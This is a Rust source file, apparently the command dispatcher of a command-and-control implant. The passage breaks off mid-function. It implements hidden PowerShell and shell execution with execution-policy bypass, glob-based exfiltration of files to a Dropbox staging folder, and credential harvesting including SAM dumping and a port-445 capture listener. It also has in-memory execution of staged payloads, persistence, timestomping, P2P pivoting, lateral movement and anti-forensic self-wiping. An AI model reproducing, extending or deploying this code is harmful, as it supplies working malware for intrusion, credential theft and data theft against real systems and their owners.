//! Command dispatcher — handles every C2 verb the controller can send.
//!
//! All handlers receive the SharedTransport so they can stage files on Dropbox.
//! Sleep and jitter state is shared via AtomicU64.

use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use rand::RngCore;
use crate::s;
use crate::transport::SharedTransport;
use crate::persist;
use crate::creds;
use crate::inlinexec;
use crate::protocol::{Task, TaskResponse};

fn staging_token() -> String {
    let mut buf = [0u8; 4];
    rand::thread_rng().fill_bytes(&mut buf);
    hex::encode(buf)
}

pub struct AgentState {
    pub base_sleep:   Arc<AtomicU64>,
    pub jitter_pct:   Arc<AtomicU64>,
    pub hb_seq:       Arc<AtomicU64>,
    pub operator_cwd: std::sync::Mutex<String>,
    pub blob_path:    String,
    pub folder_path:  String,
    pub input_path:   String,
    pub output_path:  String,
    pub epoch_key:    std::sync::Mutex<Option<[u8; 32]>>,
}

impl AgentState {
    pub fn new(
        base_sleep: u64, jitter_pct: u64,
        folder_path: &str, blob_path: &str,
        input_file: &str, output_file: &str,
    ) -> Arc<Self> {
        let cwd = std::env::current_dir()
            .map(|p| p.display().to_string())
            .unwrap_or_default();
        Arc::new(Self {
            base_sleep:   Arc::new(AtomicU64::new(base_sleep)),
            jitter_pct:   Arc::new(AtomicU64::new(jitter_pct)),
            hb_seq:       Arc::new(AtomicU64::new(0)),
            operator_cwd: std::sync::Mutex::new(cwd),
            blob_path:    blob_path.to_string(),
            folder_path:  folder_path.to_string(),
            input_path:   format!("{}{}", folder_path, input_file),
            output_path:  format!("{}{}", folder_path, output_file),
            epoch_key:    std::sync::Mutex::new(None),
        })
    }
}

/// Dispatch a task and return a `TaskResponse`.
/// Returns `None` to signal EXIT/KILL (caller should terminate).
pub fn dispatch(
    task: &Task,
    state: &Arc<AgentState>,
    transport: &SharedTransport,
    session_key: &[u8; 32],
) -> Option<TaskResponse> {
    match task.kind.as_str() {
        "exit" => return None,

        "kill" => {
            cascade_kill_children();
            kill_cleanup(state, transport);
            return None;
        }

        "sysinfo" => {
            Some(TaskResponse::ok(task, crate::sysinfo::full_sysinfo()))
        }

        "env" => {
            Some(TaskResponse::ok(task, cmd_env()))
        }

        "sleep" => {
            let secs = task.arg_u64("seconds");
            Some(TaskResponse::ok(task, cmd_sleep(secs, state)))
        }

        "jitter" => {
            let pct = task.arg_u64("percent");
            Some(TaskResponse::ok(task, cmd_jitter(pct, state)))
        }

        "shell" => {
            Some(cmd_shell(task, state))
        }

        "download" => {
            Some(cmd_download(task, state, transport))
        }

        "upload" => {
            Some(cmd_upload(task, state, transport, session_key))
        }

        "exfil" => {
            Some(TaskResponse::ok(task, cmd_exfil(task, state, transport)))
        }

        "timestomp" => {
            let target = task.arg_str("target");
            let reffile = task.arg_str("reference");
            Some(TaskResponse::ok(task, cmd_timestomp(target, reffile)))
        }

        "timestomp_set" => {
            let target = task.arg_str("target");
            let ts     = task.arg_str("timestamp");
            Some(TaskResponse::ok(task, cmd_timestomp_set(target, ts)))
        }

        "persist_probe" => {
            let tech = task.arg_str("technique");
            let out  = persist::probe(if tech.is_empty() { None } else { Some(tech) }, &state.blob_path);
            Some(TaskResponse::ok(task, out))
        }

        "persist_install" => {
            let tech = task.arg_str("technique");
            let raw  = persist::technique_install(tech, &state.blob_path);
            let (out, arts) = crate::protocol::parse_artifacts(&raw);
            Some(TaskResponse::ok_artifacts(task, out, arts))
        }

        "persist_remove" => {
            let tech = task.arg_str("technique");
            let raw  = persist::technique_remove(tech);
            let (out, arts) = crate::protocol::parse_artifacts(&raw);
            Some(TaskResponse::ok_artifacts(task, out, arts))
        }

        "persist_status" => {
            let tech = task.arg_str("technique");
            let out  = persist::technique_status(tech, &state.blob_path);
            Some(TaskResponse::ok(task, out))
        }

        // ── Credential Harvesting ────────────────────────────────────────────
        "creds_harvest" => {
            let decrypt = task.args.get("decrypt").and_then(|v| v.as_bool()).unwrap_or(false);
            let (output, files) = creds::harvest(state, transport, decrypt);
            if files.is_empty() {
                Some(TaskResponse::ok(task, output))
            } else {
                Some(TaskResponse::ok_staged_files(task, output, files))
            }
        }

        "creds_coerce" => {
            Some(TaskResponse::ok(task, creds::coerce()))
        }

        "creds_sam" => {
            let (output, files) = creds::sam(state, transport);
            if files.is_empty() {
                Some(TaskResponse::ok(task, output))
            } else {
                Some(TaskResponse::ok_staged_files(task, output, files))
            }
        }

        "creds_listen_start" => {
            let port = task.arg_u64("port") as u16;
            let port = if port == 0 { 445 } else { port };
            let proto = task.arg_str("proto");
            Some(TaskResponse::ok(task, creds::listen_start(port, proto)))
        }

        "creds_listen_stop" => {
            let spec = task.arg_str("spec");
            Some(TaskResponse::ok(task, creds::listen_stop(spec)))
        }

        "creds_listen_dump" => {
            Some(TaskResponse::ok(task, creds::listen_dump()))
        }

        // ── In-Memory Execution ──
        "bof_exec" => {
            let staging = task.arg_str("staging_path");
            let args = task.arg_str("args");
            crate::dlog!("dispatch", "bof_exec staging={} args={:?}", staging, args);
            let result = inlinexec::bof_exec(state, transport, session_key, staging, args);
            crate::dlog!("dispatch", "bof_exec done, output_len={}", result.len());
            Some(TaskResponse::ok(task, result))
        }
        "assembly_exec" => {
            let staging = task.arg_str("staging_path");
            let args = task.arg_str("args");
            crate::dlog!("dispatch", "assembly_exec staging={} args={:?}", staging, args);
            let result = inlinexec::assembly_exec(state, transport, session_key, staging, args);
            crate::dlog!("dispatch", "assembly_exec done, output_len={}", result.len());
            Some(TaskResponse::ok(task, result))
        }
        "assembly_exec_ab" => {
            let staging = task.arg_str("staging_path");
            let args = task.arg_str("args");
            crate::dlog!("dispatch", "assembly_exec_ab staging={} args={:?}", staging, args);
            let result = inlinexec::assembly_exec_ab(state, transport, session_key, staging, args);
            crate::dlog!("dispatch", "assembly_exec_ab done, output_len={}", result.len());
            Some(TaskResponse::ok(task, result))
        }
        "memexec" => {
            let staging = task.arg_str("staging_path");
            let args = task.arg_str("args");
            crate::dlog!("dispatch", "memexec staging={} args={:?}", staging, args);
            let result = inlinexec::memexec(state, transport, session_key, staging, args);
            crate::dlog!("dispatch", "memexec done, output_len={}", result.len());
            Some(TaskResponse::ok(task, result))
        }
        "script_exec" => {
            let staging = task.arg_str("staging_path");
            let args = task.arg_str("args");
            crate::dlog!("dispatch", "script_exec staging={} args={:?}", staging, args);
            let result = inlinexec::script_exec(state, transport, session_key, staging, args);
            crate::dlog!("dispatch", "script_exec done, output_len={}", result.len());
            Some(TaskResponse::ok(task, result))
        }
        "script_exec_ab" => {
            let staging = task.arg_str("staging_path");
            let args = task.arg_str("args");
            crate::dlog!("dispatch", "script_exec_ab staging={} args={:?}", staging, args);
            let result = inlinexec::script_exec_ab(state, transport, session_key, staging, args);
            crate::dlog!("dispatch", "script_exec_ab done, output_len={}", result.len());
            Some(TaskResponse::ok(task, result))
        }

        // ── P2P Commands ─────────────────────────────────────────────────────
        "p2p_link_tcp" => {
            let target = task.arg_str("target");
            let port = task.arg_u64("port") as u16;
            let addr = format!("{}:{}", target, if port == 0 { 4444 } else { port });
            Some(TaskResponse::ok(task, cmd_p2p_link_tcp(&addr, &task.id)))
        }

        "p2p_link_smb" => {
            let target = task.arg_str("target");
            let pipe   = task.arg_str("pipe_name");
            let pipe_name = if pipe.is_empty() { "stratum" } else { pipe };
            Some(TaskResponse::ok(task, cmd_p2p_link_smb(target, pipe_name)))
        }

        "p2p_unlink" => {
            let guid_hex = task.arg_str("guid");
            Some(TaskResponse::ok(task, cmd_p2p_unlink(guid_hex)))
        }

        "p2p_status" => {
            Some(TaskResponse::ok(task, cmd_p2p_status()))
        }

        "p2p_listener_start_tcp" => {
            let addr = task.arg_str("addr");
            let bind = if addr.is_empty() { "0.0.0.0:4444" } else { addr };
            Some(TaskResponse::ok(task, cmd_p2p_listener_start_tcp(bind)))
        }

        "p2p_listener_stop" => {
            let addr = task.arg_str("addr");
            Some(TaskResponse::ok(task, cmd_p2p_listener_stop(addr)))
        }

        // ── Jump (lateral movement) ──────────────────────────────────────
        "jump" => {
            Some(cmd_jump(task, state, transport, session_key))
        }

        other => {
            Some(TaskResponse::err(task, format!("ERROR: unknown task type '{}'", other)))
        }
    }
}

pub fn dispatch_p2p(
    task: &Task,
    state: &Arc<AgentState>,
) -> Option<TaskResponse> {
    match task.kind.as_str() {
        "exit" => return None,
        "kill" => {
            cascade_kill_children();
            return None;
        }
        "sysinfo" => Some(TaskResponse::ok(task, crate::sysinfo::full_sysinfo())),
        "env" => Some(TaskResponse::ok(task, cmd_env())),
        "sleep" => {
            let secs = task.arg_u64("seconds");
            Some(TaskResponse::ok(task, cmd_sleep(secs, state)))
        }
        "jitter" => {
            let pct = task.arg_u64("percent");
            Some(TaskResponse::ok(task, cmd_jitter(pct, state)))
        }
        "shell" => Some(cmd_shell(task, state)),
        "timestomp" => {
            let target = task.arg_str("target");
            let reffile = task.arg_str("reference");
            Some(TaskResponse::ok(task, cmd_timestomp(target, reffile)))
        }
        "timestomp_set" => {
            let target = task.arg_str("target");
            let ts     = task.arg_str("timestamp");
            Some(TaskResponse::ok(task, cmd_timestomp_set(target, ts)))
        }
        "persist_probe" => {
            let tech = task.arg_str("technique");
            let out  = persist::probe(if tech.is_empty() { None } else { Some(tech) }, &state.blob_path);
            Some(TaskResponse::ok(task, out))
        }
        "persist_install" => {
            let tech = task.arg_str("technique");
            let raw  = persist::technique_install(tech, &state.blob_path);
            let (out, arts) = crate::protocol::parse_artifacts(&raw);
            Some(TaskResponse::ok_artifacts(task, out, arts))
        }
        "persist_remove" => {
            let tech = task.arg_str("technique");
            let raw  = persist::technique_remove(tech);
            let (out, arts) = crate::protocol::parse_artifacts(&raw);
            Some(TaskResponse::ok_artifacts(task, out, arts))
        }
        "persist_status" => {
            let tech = task.arg_str("technique");
            let out  = persist::technique_status(tech, &state.blob_path);
            Some(TaskResponse::ok(task, out))
        }
        "p2p_status" => Some(TaskResponse::ok(task, cmd_p2p_status())),
        other => {
            Some(TaskResponse::err(task, format!("ERROR: '{}' requires cloud transport (not available on P2P child)", other)))
        }
    }
}

// ── ENV ───────────────────────────────────────────────────────────────────────
fn cmd_env() -> String {
    use std::collections::BTreeMap;
    let mut env_vars: BTreeMap<String, String> = BTreeMap::new();
    for (key, val) in std::env::vars() {
        env_vars.insert(key, val);
    }
    let mut output = String::new();
    for (key, val) in env_vars {
        output.push_str(&format!("{}={}\n", key, val));
    }
    output
}

// ── SHELL ─────────────────────────────────────────────────────────────────────
fn cmd_shell(task: &Task, state: &Arc<AgentState>) -> TaskResponse {
    let cmd     = task.arg_str("cmd");
    let req_cwd = task.arg_str("cwd");

    let mut warn_prefix = String::new();

    // Apply requested CWD; surface failure explicitly rather than silently skipping
    if !req_cwd.is_empty() {
        if std::env::set_current_dir(req_cwd).is_ok() {
            *state.operator_cwd.lock().unwrap() = req_cwd.to_string();
        } else {
            let actual = std::env::current_dir()
                .map(|p| p.display().to_string())
                .unwrap_or_else(|_| "<unknown>".to_string());
            warn_prefix = format!("[WARN: cd '{}' failed — running from {}]\n", req_cwd, actual);
        }
    }

    // Validate stored operator_cwd; if it no longer exists (e.g. /tmp wiped after
    // reboot) fall back to the process's actual CWD to avoid a confusing exec error.
    let cwd = {
        let stored = state.operator_cwd.lock().unwrap().clone();
        if !stored.is_empty() && !std::path::Path::new(&stored).exists() {
            let fallback = std::env::current_dir()
                .map(|p| p.display().to_string())
                .unwrap_or_else(|_| "/".to_string());
            warn_prefix.push_str(&format!(
                "[WARN: stored cwd '{}' no longer exists — running from {}]\n",
                stored, fallback
            ));
            *state.operator_cwd.lock().unwrap() = fallback.clone();
            fallback
        } else {
            stored
        }
    };

    // Native cd handling — subprocess cd doesn't affect the agent process.
    // Detect bare "cd", "cd <path>", "cd ~" commands (trimmed, no pipes/chains).
    let trimmed = cmd.trim();
    let is_bare_cd = trimmed == "cd"
        || trimmed.starts_with("cd ")
        || trimmed.starts_with("cd\t");
    if is_bare_cd && !trimmed.contains("&&") && !trimmed.contains("||")
        && !trimmed.contains(';') && !trimmed.contains('|')
    {
        let target = trimmed[2..].trim();
        let resolved = if target.is_empty() || target == "~" {
            // cd with no args or cd ~ → home directory
            std::env::var("HOME")
                .or_else(|_| std::env::var("USERPROFILE"))
                .unwrap_or_else(|_| "/".to_string())
        } else if target == "-" {
            // cd - → previous directory (not tracked, return error)
            let out = format!("{}[exit code: 0]", warn_prefix);
            let cur = state.operator_cwd.lock().unwrap().clone();
            return TaskResponse {
                id: task.id.clone(), kind: task.kind.clone(),
                status: "ok".to_string(), output: out,
                cwd: cur, session_token: task.session_token.clone().unwrap_or_default(),
                ..Default::default()
            };
        } else if target.starts_with('/') || target.starts_with('\\') {
            // Absolute path
            target.to_string()
        } else if target.starts_with("~/") {
            // Home-relative
            let home = std::env::var("HOME")
                .or_else(|_| std::env::var("USERPROFILE"))
                .unwrap_or_else(|_| "/".to_string());
            format!("{}/{}", home.trim_end_matches('/'), &target[2..])
        } else {
            // Relative path — resolve from current cwd
            let base = std::path::Path::new(&cwd);
            base.join(target).display().to_string()
        };

        // Canonicalize to resolve ".." and symlinks
        let canon = std::fs::canonicalize(&resolved);
        match canon {
            Ok(p) if p.is_dir() => {
                let new_cwd = p.display().to_string();
                let _ = std::env::set_current_dir(&new_cwd);
                *state.operator_cwd.lock().unwrap() = new_cwd.clone();
                return TaskResponse {
                    id: task.id.clone(), kind: task.kind.clone(),
                    status: "ok".to_string(),
                    output: format!("{}[exit code: 0]", warn_prefix),
                    cwd: new_cwd,
                    session_token: task.session_token.clone().unwrap_or_default(),
                    ..Default::default()
                };
            }
            Ok(p) => {
                // Path exists but is not a directory
                return TaskResponse {
                    id: task.id.clone(), kind: task.kind.clone(),
                    status: "error".to_string(),
                    output: format!("cd: not a directory: {}", p.display()),
                    cwd: cwd.clone(),
                    session_token: task.session_token.clone().unwrap_or_default(),
                    ..Default::default()
                };
            }
            Err(_) => {
                return TaskResponse {
                    id: task.id.clone(), kind: task.kind.clone(),
                    status: "error".to_string(),
                    output: format!("cd: no such file or directory: {}", resolved),
                    cwd: cwd.clone(),
                    session_token: task.session_token.clone().unwrap_or_default(),
                    ..Default::default()
                };
            }
        }
    }

    const CMD_TIMEOUT_SECS: u64 = 60;
    const MAX_OUTPUT_BYTES: usize = 4 * 1024 * 1024; // 4 MB hard cap

    // Spawn subprocess; send its pid/handle-id to the main thread so it can be
    // killed on timeout. Output arrives on a separate channel.
    let cmd_owned = cmd.to_string();
    let cwd_owned = cwd.clone();
    let (pid_tx,  pid_rx)  = std::sync::mpsc::channel::<u32>();
    let (out_tx,  out_rx)  = std::sync::mpsc::channel::<Result<std::process::Output, std::io::Error>>();

    std::thread::spawn(move || {
        #[cfg(windows)]
        let spawn_result = {
            use std::os::windows::process::CommandExt;
            use std::process::Stdio;
            let ps_args = [
                s!("-NoProfile"), s!("-NonInteractive"), s!("-WindowStyle"), s!("Hidden"),
                s!("-ExecutionPolicy"), s!("Bypass"), s!("-Command"), cmd_owned.clone(),
            ];
            std::process::Command::new(s!("powershell"))
                .args(&ps_args)
                .current_dir(&cwd_owned)
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .creation_flags(0x0800_0000)
                .spawn()
        };
        #[cfg(unix)]
        let spawn_result = {
            use std::process::Stdio;
            std::process::Command::new("/bin/sh")
                .args(["-c", &cmd_owned])
                .current_dir(&cwd_owned)
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn()
        };

        match spawn_result {
            Err(e) => { let _ = out_tx.send(Err(e)); }
            Ok(mut child) => {
                let _ = pid_tx.send(child.id());
                let _ = out_tx.send(child.wait_with_output());
            }
        }
    });

    // Receive pid so we can kill on timeout (ignore if spawn failed — out_rx will carry the error)
    let child_pid: Option<u32> = pid_rx.recv_timeout(std::time::Duration::from_secs(5)).ok();

    let (output, status) = match out_rx.recv_timeout(std::time::Duration::from_secs(CMD_TIMEOUT_SECS)) {
        Ok(Ok(out)) => {
            let stdout = &out.stdout[..out.stdout.len().min(MAX_OUTPUT_BYTES)];
            let mut s  = String::from_utf8_lossy(stdout).to_string();
            let remaining = MAX_OUTPUT_BYTES.saturating_sub(s.len());
            if remaining > 0 {
                let err = String::from_utf8_lossy(&out.stderr[..out.stderr.len().min(remaining)]).to_string();
                if !err.is_empty() { s.push_str(&err); }
            }
            if s.len() >= MAX_OUTPUT_BYTES {
                s.push_str("\n[TRUNCATED: output exceeded 4 MB]");
            }
            if s.is_empty() { s = format!("[exit code: {}]", out.status.code().unwrap_or(-1)); }
            (s, out.status.success())
        }
        Ok(Err(e)) => (format!("ERROR: exec '{}': {}", cmd, e), false),
        Err(_) => {
            // Timeout: kill child so it doesn't linger as an orphan.
            if let Some(pid) = child_pid {
                #[cfg(unix)]
                unsafe {
                    // Kill the shell directly. Grandchildren become orphans adopted by init;
                    // acceptable — killing the group risks hitting the agent's own pgid.
                    libc::kill(pid as libc::pid_t, libc::SIGKILL);
                }
                #[cfg(windows)]
                unsafe {
                    use windows_sys::Win32::Foundation::CloseHandle;
                    let h = crate::dynapi::open_process(0x0001, 0, pid); // PROCESS_TERMINATE
                    if h != 0 { crate::dynapi::terminate_process(h, 1); CloseHandle(h); }
                }
            }
            // After kill, try to collect any partial output the process wrote
            // before being killed (e.g. stderr from nc, curl, etc.)
            match out_rx.recv_timeout(std::time::Duration::from_secs(2)) {
                Ok(Ok(out)) => {
                    let mut s = String::from_utf8_lossy(
                        &out.stdout[..out.stdout.len().min(MAX_OUTPUT_BYTES)]
                    ).to_string();
                    let remaining = MAX_OUTPUT_BYTES.saturating_sub(s.len());
                    if remaining > 0 {
                        let err = String::from_utf8_lossy(
                            &out.stderr[..out.stderr.len().min(remaining)]
                        ).to_string();
                        if !err.is_empty() {
                            if !s.is_empty() { s.push('\n'); }
                            s.push_str(&err);
                        }
                    }
                    if s.is_empty() {
                        (format!("ERROR: command timed out after {}s (no output)", CMD_TIMEOUT_SECS), false)
                    } else {
                        s.push_str(&format!("\n[timed out after {}s]", CMD_TIMEOUT_SECS));
                        (s, false)
                    }
                }
                _ => (format!("ERROR: command timed out after {}s", CMD_TIMEOUT_SECS), false),
            }
        }
    };

    // Prepend any CWD warnings before the command output
    let output = if warn_prefix.is_empty() {
        output
    } else {
        format!("{}{}", warn_prefix, output)
    };

    // Capture CWD after execution
    let new_cwd = std::env::current_dir()
        .map(|p| p.display().to_string())
        .unwrap_or_else(|_| cwd.clone());
    *state.operator_cwd.lock().unwrap() = new_cwd.clone();

    TaskResponse {
        id:            task.id.clone(),
        kind:          task.kind.clone(),
        status:        if status { "ok".to_string() } else { "error".to_string() },
        output,
        cwd:           new_cwd,
        session_token: task.session_token.clone().unwrap_or_default(),
        ..Default::default()
    }
}

// ── DOWNLOAD ──────────────────────────────────────────────────────────────────
fn cmd_download(task: &Task, state: &Arc<AgentState>, transport: &SharedTransport) -> TaskResponse {
    let path = task.arg_str("target_path");
    if !std::path::Path::new(path).exists() {
        return TaskResponse::err(task, format!("ERROR: File not found: {}", path));
    }
    let data = match std::fs::read(path) {
        Ok(d) => d,
        Err(e) => return TaskResponse::err(task, format!("ERROR: read {}: {}", path, e)),
    };
    let name = std::path::Path::new(path)
        .file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_else(|| "file".to_string());
    let staging_dest = format!("{}/staging/{}_{}_{}", state.folder_path.trim_end_matches('/'),
        env!("STRATUM_STAGING_PREFIX"), staging_token(), name);
    if transport.upload(&staging_dest, &data) {
        TaskResponse::ok_staging(task, format!("staged {} ({} bytes)", name, data.len()), staging_dest)
    } else {
        TaskResponse::err(task, "ERROR: Failed to stage file".to_string())
    }
}

// ── UPLOAD ────────────────────────────────────────────────────────────────────
fn cmd_upload(task: &Task, state: &Arc<AgentState>, transport: &SharedTransport,
              session_key: &[u8; 32]) -> TaskResponse {
    let staging_src = task.arg_str("staging_path");
    let file_name   = task.arg_str("filename");
    let dest_path   = task.arg_str("dest_path");

    // Resolve effective CWD: fall back to process CWD if stored value no longer exists,
    // and persist the correction so subsequent commands don't repeat the stale lookup.
    let cwd = {
        let stored = state.operator_cwd.lock().unwrap().clone();
        if !stored.is_empty() && !std::path::Path::new(&stored).exists() {
            let fallback = std::env::current_dir()
                .map(|p| p.display().to_string())
                .unwrap_or(stored);
            *state.operator_cwd.lock().unwrap() = fallback.clone();
            fallback
        } else {
            stored
        }
    };

    let save_path = if !dest_path.is_empty() {
        let p = std::path::Path::new(dest_path);
        if p.is_absolute() { p.to_path_buf() } else { std::path::Path::new(&cwd).join(p) }
    } else {
        std::path::Path::new(&cwd).join(file_name)
    };

    let save_path = if save_path.is_dir() {
        save_path.join(file_name)
    } else {
        save_path
    };

    if let Some(parent) = save_path.parent() {
        let _ = std::fs::create_dir_all(parent);
    }

    match transport.download(staging_src) {
        Some(enc_data) if !enc_data.is_empty() => {
            let data = {
                let ek = state.epoch_key.lock().unwrap();
                match ek.as_ref().and_then(|k| crate::crypto::decrypt_staging(&enc_data, k)) {
                    Some(d) => d,
                    None => return TaskResponse::err(task, "ERROR: staging decrypt failed".to_string()),
                }
            };
            match std::fs::write(&save_path, &data) {
                Ok(_)  => TaskResponse::ok(task, format!("OK: Saved {} ({} bytes) to {}", file_name, data.len(), save_path.display())),
                Err(e) => TaskResponse::err(task, format!("ERROR: write {}: {}", save_path.display(), e)),
            }
        }
        Some(_) => TaskResponse::err(task, "ERROR: Staging file returned empty".to_string()),
        None    => TaskResponse::err(task, "ERROR: Failed to download from staging".to_string()),
    }
}

// ── EXFIL ─────────────────────────────────────────────────────────────────────
fn cmd_exfil(task: &Task, state: &Arc<AgentState>, transport: &SharedTransport) -> String {
    use glob::glob;
    let pattern = task.arg_str("pattern");
    let matches: Vec<_> = match glob(pattern) {
        Ok(g) => g.filter_map(|p| p.ok()).filter(|p| p.is_file()).collect(),
        Err(e) => return format!("ERROR: invalid glob '{}': {}", pattern, e),
    };
    if matches.is_empty() {
        return format!("ERROR: no files matched '{}'", pattern);
    }
    let mut results = Vec::new();
    for path in &matches {
        let data = match std::fs::read(path) {
            Ok(d) => d,
            Err(e) => { results.push(format!("SKIP {}: {}", path.display(), e)); continue; }
        };
        let name    = path.file_name().unwrap().to_string_lossy();
        let staging = format!("{}/staging/{}_{}_{}", state.folder_path.trim_end_matches('/'),
            env!("STRATUM_STAGING_PREFIX"), staging_token(), name);
        if transport.upload(&staging, &data) {
            results.push(format!("OK: {} → {}", path.display(), staging));
        } else {
            results.push(format!("FAIL: {}", path.display()));
        }
    }
    results.join("\n")
}

// ── SLEEP ─────────────────────────────────────────────────────────────────────
fn cmd_sleep(secs: u64, state: &Arc<AgentState>) -> String {
    if secs < 1 {
        return "ERROR: Invalid sleep value (must be >= 1)".to_string();
    }
    let old = state.base_sleep.swap(secs, Ordering::Relaxed);
    format!("OK: Sleep changed from {}s to {}s (jitter: {}%)",
        old, secs, state.jitter_pct.load(Ordering::Relaxed))
}

// ── JITTER ────────────────────────────────────────────────────────────────────
fn cmd_jitter(pct: u64, state: &Arc<AgentState>) -> String {
    if pct > 50 {
        return "ERROR: Invalid jitter value (must be 0–50)".to_string();
    }
    let old = state.jitter_pct.swap(pct, Ordering::Relaxed);
    format!("OK: Jitter changed from {}% to {}% (sleep: {}s)",
        old, pct, state.base_sleep.load(Ordering::Relaxed))
}

// ── TIMESTOMP ────────────────────────────────────────────────────────────────
fn cmd_timestomp(target: &str, reffile: &str) -> String {
    if target.is_empty() || reffile.is_empty() {
        return "ERROR: timestomp requires target and reference paths".to_string();
    }
    if !std::path::Path::new(target).exists() {
        return format!("ERROR: Target file not found: {}", target);
    }
    if !std::path::Path::new(reffile).exists() {
        return format!("ERROR: Reference file not found: {}", reffile);
    }
    match copy_timestamps(target, reffile) {
        Ok(mtime) => format!("OK: Timestamps copied from {} to {} (mtime: {})", reffile, target, mtime),
        Err(e)    => format!("ERROR: {}", e),
    }
}

// ── TIMESTOMP_SET ─────────────────────────────────────────────────────────────
fn cmd_timestomp_set(target: &str, datetime: &str) -> String {
    if target.is_empty() || datetime.is_empty() {
        return "ERROR: timestomp_set requires target and timestamp".to_string();
    }
    if !std::path::Path::new(target).exists() {
        return format!("ERROR: Target file not found: {}", target);
    }
    match set_timestamp(target, datetime) {
        Ok(_)  => format!("OK: Timestamps set on {} to {}", target, datetime),
        Err(e) => format!("ERROR: {}", e),
    }
}

// ── KILL ──────────────────────────────────────────────────────────────────────
fn kill_cleanup(state: &Arc<AgentState>, transport: &SharedTransport) {
    // Wipe blob with random bytes before deletion (matches PS/SH agent behaviour).
    if !state.blob_path.is_empty() {
        if let Ok(meta) = std::fs::metadata(&state.blob_path) {
            let size = meta.len() as usize;
            let mut rnd = vec![0u8; size];
            rand::thread_rng().fill_bytes(&mut rnd);
            let _ = std::fs::write(&state.blob_path, rnd);
        }
        let _ = std::fs::remove_file(&state.blob_path);
    }
    let _ = persist::remove_all();
    transport.upload(&state.input_path, b"MZ");
}

/// kill_cleanup + cascade. Called on kill-date expiry.
pub(crate) fn kill_cleanup_self(state: &Arc<AgentState>, transport: &SharedTransport) {
    cascade_kill_children();
    kill_cleanup(state, transport);
}

fn cascade_kill_children() {
    let child_guids = P2P_REGISTRY.child_guids();
    if child_guids.is_empty() { return; }
    crate::dlog!("kill", "cascading kill to {} children", child_guids.len());
    for cg in &child_guids {
        let kill_payload = b"{\"id\":\"kill-cascade\",\"kind\":\"kill\",\"args\":\"\"}";
        let msg = crate::p2p::RoutedMessage {
            msg_type: crate::p2p::MsgType::Delivery,
            next_guid: *cg,
            payload: kill_payload.to_vec(),
        };
        let serialized = msg.serialize();
        let children = P2P_REGISTRY.children.lock().unwrap();
        if let Some(child) = children.get(cg) {
            if let Some(enc) = crate::p2p::router::encrypt_for_link(&child.link_key, &serialized) {
                let _ = child.transport.send(&enc);
            }
        }
    }
    std::thread::sleep(std::time::Duration::from_millis(500));
    for cg in &child_guids {
        if let Some(link) = P2P_REGISTRY.remove_child(cg) {
            link.transport.close();
        }
    }
    TCP_LISTENER_MGR.stop_all();
}

// ── P2P commands ─────────────────────────────────────────────────────────────

use once_cell::sync::Lazy;
use crate::p2p::{LinkRegistry, LinkType};
use std::sync::Mutex;

static P2P_REGISTRY: Lazy<std::sync::Arc<LinkRegistry>> = Lazy::new(|| {
    let mut guid = [0u8; 16];
    rand::thread_rng().fill_bytes(&mut guid);
    std::sync::Arc::new(LinkRegistry::new(guid))
});

static TCP_LISTENER_MGR: Lazy<crate::p2p::tcp::TcpListenerManager> =
    Lazy::new(|| crate::p2p::tcp::TcpListenerManager::new());

pub fn p2p_registry() -> &'static std::sync::Arc<LinkRegistry> {
    &P2P_REGISTRY
}

fn cmd_p2p_link_tcp(addr: &str, _task_id: &str) -> String {
    use std::time::{Duration, Instant};

    let registry = P2P_REGISTRY.clone();
    let start = Instant::now();
    let max_duration = Duration::from_secs(60);
    let retry_interval = Duration::from_secs(5);
    let connect_timeout = Duration::from_secs(5);
    let mut attempt = 0u32;

    loop {
        attempt += 1;
        crate::dlog!("p2p_link", "attempt {} to {}", attempt, addr);

        match crate::p2p::tcp::tcp_connect(addr, connect_timeout) {
            Ok(transport) => {
                let arc_t: std::sync::Arc<dyn crate::p2p::P2PTransport> =
                    std::sync::Arc::new(transport);
                match crate::p2p::link::link_as_parent(arc_t, registry.my_guid, LinkType::Tcp) {
                    Ok(link) => {
                        let guid_hex = hex::encode(&link.guid);
                        let address = link.address.clone();
                        let child_guid = link.guid;
                        let link_key = link.link_key;
                        registry.add_child(link);
                        crate::dlog!("p2p_link", "linked to {} (GUID {})", address, guid_hex);

                        // Wait for child's auto-checkin — up to 10s
                        let mut checkin_json_str = String::new();
                        for _ci in 0..10 {
                            let recv_res = {
                                let children = registry.children.lock().unwrap();
                                if let Some(child) = children.get(&child_guid) {
                                    match child.transport.recv() {
                                        Ok(enc) => {
                                            crate::p2p::router::decrypt_from_link(&link_key, &enc)
                                        }
                                        Err(_) => None,
                                    }
                                } else { None }
                            };
                            if let Some(plain) = recv_res {
                                if plain.len() >= 1 && plain[0] == crate::p2p::CtrlType::Heartbeat as u8 {
                                    continue;
                                }
                                if let Ok(checkin) = serde_json::from_slice::<serde_json::Value>(&plain) {
                                    if checkin.get("type").and_then(|v| v.as_str()) == Some("p2p_checkin") {
                                        checkin_json_str = serde_json::to_string(&checkin).unwrap_or_default();
                                        crate::dlog!("p2p_link", "got child checkin ({} bytes)", checkin_json_str.len());
                                    }
                                }
                                break;
                            }
                            std::thread::sleep(Duration::from_secs(1));
                        }

                        return if checkin_json_str.is_empty() {
                            format!("OK: Linked to {} via TCP (child GUID: {})",
                                    address, guid_hex)
                        } else {
                            format!("OK: Linked to {} via TCP (child GUID: {})\n---CHILD_CHECKIN---\n{}",
                                    address, guid_hex, checkin_json_str)
                        };
                    }
                    Err(e) => {
                        crate::dlog!("p2p_link", "handshake failed: {}", e);
                    }
                }
            }
            Err(e) => {
                crate::dlog!("p2p_link", "connect failed: {}", e);
            }
        }

        if start.elapsed() >= max_duration {
            crate::dlog!("p2p_link", "giving up after {} attempts ({}s)",
                         attempt, start.elapsed().as_secs());
            return format!("ERROR: Link to {} failed after {} attempts ({}s)",
                           addr, attempt, start.elapsed().as_secs());
        }

        std::thread::sleep(retry_interval);
    }
}

fn cmd_p2p_link_smb(target: &str, pipe_name: &str) -> String {
    #[cfg(windows)]
    let connect_result = crate::p2p::smb::smb_connect(target, pipe_name);

    #[cfg(not(windows))]
    let connect_result = crate::p2p::smb_client::smb_client_connect(target, pipe_name);

    let transport: std::sync::Arc<dyn crate::p2p::P2PTransport> = match connect_result {
        Ok(t) => std::sync::Arc::new(t),
        Err(e) => return format!("ERROR: SMB connect to {}\\pipe\\{} failed: {}", target, pipe_name, e),
    };
